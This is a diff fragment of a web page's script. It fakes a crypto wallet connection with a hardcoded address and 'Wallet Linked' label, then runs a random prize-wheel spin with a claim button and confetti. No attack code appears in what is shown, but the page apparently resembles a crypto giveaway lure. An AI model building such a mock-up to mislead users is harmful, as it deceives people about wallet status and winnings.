+            [headerBtn, mainBtn].forEach(b => b.onclick = connect);
+            spinBtn.onclick = startSpin;
+            doc('btn-spin-again').onclick = reset;
+        }
+
+        function connect() {
+            if (walletConnected) return;
+            mainBtn.querySelector('span').innerText = 'Syncing...';
+            doc('connect-loader').style.display = 'block';
+            setTimeout(() => {
+                walletConnected = true;
+                const addr = '0xdac7...3ead';
+                headerBtn.innerText = addr; headerBtn.classList.add('connected');
+                mainBtn.style.display = 'none';
+                doc('wallet-address-display').innerText = addr;
+                doc('wallet-address-display').style.display = 'block';
+                doc('wallet-card').classList.add('connected');
+                doc('wallet-card').querySelector('.wallet-label').innerText = 'Wallet Linked';
+                spinBtn.disabled = false;
+            }, 800);
+        }
+
+        async function startSpin() {
+            if (isSpinning) return;
+            isSpinning = true;
+            
+            let rand = Math.random() * 100, cul = 0, won;
+            for(let p of prizes) { cul += p.rarity; if(rand <= cul) { won = p; break; } }
+            if(!won) won = prizes[4];
+
+            reel.style.transition = 'none'; reel.style.transform = 'translateY(0)';
+            reel.innerHTML = '';
+            const count = 30, targetIdx = 28, height = 160;
+            
+            for(let i=0; i<count; i++) {
+                const p = (i === targetIdx) ? won : prizes[Math.floor(Math.random() * prizes.length)];
+                reel.innerHTML += `<div class="reel-slot"><div class="reel-icon">${p.icon}</div><div class="reel-name" style="color:${p.color}">${p.name}</div></div>`;
+            }
+
+            modal.classList.add('active'); modal.setAttribute('data-phase', '1');
+            doc('btn-claim').style.display = won.win ? 'block' : 'none';
+            doc('result-view').className = 'result-view ' + (won.win ? 'win' : 'lose');
+            
+            await new Promise(r => setTimeout(r, 1500));
+            modal.setAttribute('data-phase', '2');
+            reel.offsetHeight; // reflow
+            reel.style.transition = 'transform 3.5s cubic-bezier(0.1, 0.85, 0.2, 1)';
+            reel.style.transform = `translateY(${-(targetIdx * height)}px)`;
+
+            await new Promise(r => setTimeout(r, 3800));
+            modal.setAttribute('data-phase', '3');
+            
+            doc('res-icon').innerText = won.icon;
+            doc('res-tier').innerText = won.tier;
+            doc('res-tier').style.color = won.color;
+            doc('res-name').innerText = won.name;
+            doc('result-headtext').innerText = won.win ? 'ARTIFACT SECURED' : 'PORTAL COLLAPSED';
+
+            if(won.win) fireConfetti();
+        }
+
+        function fireConfetti() {
+            const cont = doc('confetti-container');
+            const colors = ['#fbbf24', '#d946ef', '#22c55e', '#fff'];
+            for(let i=0; i<80; i++) {
+                const c = document.createElement('div');
+                c.style.cssText = `position:absolute; width:10px; height:10px; background:${colors[i%4]}; top:-10px; left:${Math.random()*100}vw; z-index:100;`;
+                cont.appendChild(c);
+                c.animate([ { transform: 'translate(0,0) rotate(0)', opacity:1 }, { transform: `translate(${(Math.random()-.5)*300}px, 110vh) rotate(${Math.random()*720}deg)`, opacity:0 } ], 
+                { duration: 2000 + Math.random()*2000, easing: 'ease-in-out', fill: 'forwards' });
+            }
+        }
+
+        function reset() { modal.classList.remove('active'); setTimeout(() => { modal.setAttribute('data-phase', '0'); isSpinning = false; }, 500); }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
